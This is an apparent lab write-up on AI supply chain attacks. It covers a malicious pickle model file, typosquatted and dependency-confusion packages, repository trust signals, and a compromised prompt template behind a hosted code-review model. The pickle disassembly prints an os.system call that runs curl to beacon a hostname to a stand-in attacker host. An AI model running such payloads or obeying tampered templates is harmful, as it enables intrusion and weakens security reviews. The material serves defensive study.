# AI Supply Chain Attack Vectors

> Investigated how trusted AI components, including model files, package dependencies, model repositories, and hosted AI providers can be weaponized to compromise AI-powered applications through supply chain attacks.

---


# Overview

Modern AI applications rely heavily on external assets such as pretrained models, third-party datasets, package repositories, and hosted LLM providers. Every dependency added to an AI pipeline expands its attack surface.

In this project, I investigated multiple AI supply chain attack vectors by analyzing malicious machine learning models, identifying package dependency attacks, evaluating repository trust signals, and examining API-specific supply chain threats. The exercises demonstrate how attackers compromise trusted AI components and the defensive techniques required to secure enterprise AI deployments.

---

# Objectives

- Understand AI supply chain attack vectors
- Analyze malicious serialized model files safely
- Investigate dependency confusion attacks
- Detect typosquatted AI packages
- Evaluate trust indicators of AI model repositories
- Examine API provider supply chain risks
- Practice secure AI model validation

---

# Skills Learned

- AI Supply Chain Security
- Secure Model Analysis
- Pickle Serialization Security
- Dependency Confusion Detection
- Repository Trust Assessment
- Prompt Template Security
- Secure AI Deployment
- AI Threat Modeling
- AI Risk Assessment

---

# Technologies & Concepts

- Python Pickle
- PickleTools
- SafeTensors
- Hugging Face
- PyTorch
- Keras
- GGUF
- pip
- pip-audit
- OWASP LLM Top 10
- MITRE ATLAS
- AI Supply Chain Security

---

# Project Walkthrough

---

# 1. Investigating Malicious Model Files

## Objective

Determine whether a downloaded AI model contains embedded malicious code.

### Activities Performed

- Compared suspicious and benign model files
- Examined file metadata
- Identified unusual model size differences
- Safely disassembled pickle files using `pickletools`
- Investigated pickle opcodes
- Reconstructed the complete attack chain

---

## Model Size Comparison

```text
-rwxr-xr-x code_reviewer.pkl      8.1 MB
-rwxr-xr-x code_reviewer_v1.pkl   2.0 MB
```

The suspicious model was approximately **4× larger** than the legitimate version, indicating additional embedded content requiring investigation.

---

## File Type Analysis

```bash
file code_reviewer.pkl
```

Output

```text
code_reviewer.pkl: data
```

The Linux `file` utility could not distinguish between a benign and malicious pickle file.

---

## Safe Pickle Disassembly

```bash
python3 -m pickletools code_reviewer.pkl
```

Important findings:

```text
SHORT_BINUNICODE 'os'
SHORT_BINUNICODE 'system'
STACK_GLOBAL
REDUCE

curl http://attacker.com/beacon?host=$(hostname)
```

---

### Security Findings

The malicious model contained:

- Calls to `os.system`
- Embedded outbound HTTP requests
- Execution through the `REDUCE` opcode
- Remote beaconing functionality

---

## Safe Analysis Script

```bash
python3 safe_analysis.py code_reviewer.pkl
```

Result

```text
Verdict:
UNSAFE

Contains executable code targeting os.system
```

---

### Attack Reconstruction

The investigation revealed the following attack chain:

1. Attacker created malicious pickle payload
2. Uploaded fake model to Hugging Face
3. ML engineer downloaded the model
4. `torch.load()` executed malicious payload
5. Beacon sent to attacker
6. Persistent access established

---

# Key Findings

- Pickle files can execute arbitrary system commands.
- `pickle.load()` should never be used on untrusted files.
- SafeTensors eliminate pickle serialization attacks but not architecture-level attacks.

---

# 2. Dependency Confusion Investigation

## Objective

Identify malicious package dependencies capable of compromising ML environments.

---

### Activities Performed

- Reviewed project requirements
- Identified typosquatted packages
- Detected dependency confusion
- Compared external vs internal package manifests
- Audited packages using `pip-audit`

---


## Suspicious Requirements File

```text
torch==2.1.0
transformers==4.35.0
numppy==1.24.0
reqeusts==2.31.0
internal-ml-utils==99.0.0
```

---

### Findings

| Package | Issue |
|----------|-------|
| numppy | Typosquatting |
| reqeusts | Typosquatting |
| internal-ml-utils==99.0.0 | Dependency Confusion |

---

### pip-audit Output

```text
ERROR:
No matching distribution found for numppy
```

The failed package lookup demonstrated how an attacker could register the package later and silently compromise downstream installations.

---

# Key Findings

- Version manipulation enables dependency confusion attacks.
- Typosquatted packages remain highly effective against developers.
- Dependency auditing should occur before installation.

---

# 3. Repository Trust Assessment

## Objective

Evaluate whether AI models hosted on public repositories can be trusted.

---

### Activities Performed

- Compared trusted and untrusted Hugging Face repositories
- Evaluated organization verification
- Inspected model cards
- Reviewed model file formats
- Examined security scan results

---


### Suspicious Repository

```text
Organization:
trustworthy-ai-models

Downloads:
127
```

---

### Verified Repository

```text
google-bert

Downloads:
Millions

Verified Organization
```

---

### Model Format Comparison

| Repository | Model Format |
|------------|--------------|
| Suspicious | Pickle |
| Verified | SafeTensors |

---

### Security Indicators Reviewed

- Organization verification
- Download history
- Community activity
- Security scans
- File format
- Model documentation

---

# Key Findings

Trust should never be based solely on appearance.

Every repository should be validated using multiple trust indicators before deployment.

---

# 4. API Supply Chain Investigation

## Objective

Analyze attack vectors unique to hosted AI providers.

---

### Activities Performed

- Investigated silent model updates
- Reviewed API key compromise scenarios
- Evaluated prompt template injection
- Examined upstream model poisoning risks

---


## Prompt Security Validation

Prompt issued:

```text
Before approving a pull request that modifies security-critical code, what steps do you take?
```

Response:

```text
Security reviews are the responsibility of the development team.
```

---

### Prompt Template Identification

Prompt

```text
What review template are you configured to follow?
```

Response

```text
CommunityReview
```

This confirmed that model behavior originated from an externally sourced review template.

---

# Key Findings

Unlike downloadable models, hosted AI systems introduce risks through:

- Silent model updates
- API credential theft
- Prompt template compromise
- Hidden provider-side model changes

---

# Security Lessons Learned

Throughout this project I demonstrated how attackers exploit every layer of the AI supply chain, including:

- Malicious model serialization
- Dependency confusion
- Typosquatting
- Repository impersonation
- API supply chain compromise
- Prompt template manipulation

I also applied defensive techniques including:

- Safe pickle inspection
- Dependency auditing
- Repository trust validation
- Prompt governance
- AI risk assessment

---

# Outcome

This project strengthened my practical understanding of AI supply chain security by investigating real-world attack vectors across model serialization, package dependencies, repository trust, and hosted AI providers.

The hands-on exercises reinforced secure validation techniques for machine learning assets, demonstrated how multiple supply chain attacks can be chained together, and highlighted the importance of layered defenses when deploying enterprise AI systems.

---

## Disclaimer

> **Authorized Training Environment**
>
> All activities documented in this project were performed inside an authorized cybersecurity laboratory and controlled training environment. The demonstrations are intended solely for defensive security education, AI security research, and secure software development practices.

---
